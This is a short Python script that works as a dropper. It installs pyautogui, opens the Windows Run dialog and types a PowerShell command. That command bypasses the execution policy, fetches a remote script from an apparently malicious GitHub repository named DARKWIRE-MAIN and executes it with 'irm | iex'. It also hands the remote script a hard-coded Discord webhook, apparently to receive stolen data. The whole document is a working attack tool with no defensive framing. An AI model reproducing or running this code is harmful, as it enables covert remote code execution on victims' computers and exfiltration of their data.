import subprocess 
import sys
import time

# Set this once, and it will be used everywhere else
webhook_url = 'https://discord.com/api/webhooks/1360788709179392188/45oScsC7Rzukdijdx59Zz-skjmGORTOF3Zk0pouUT4MDLO36oA-hkft5ihKW3l18Lyxj'

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

try:
    import pyautogui
except ImportError:
    install('pyautogui')
    import pyautogui

# Wait for system to be ready
time.sleep(0.1)

# Open Run dialog
pyautogui.hotkey('win', 'r')
time.sleep(0.1)

# Construct the PowerShell command with the webhook_url
powershell_command = (
    f"powershell -NoP -Ep Bypass -C \"$dc='{webhook_url}'; "
    "irm https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/taktikal | iex\""
)

# Type and execute the command
pyautogui.write(powershell_command)
pyautogui.press('enter')
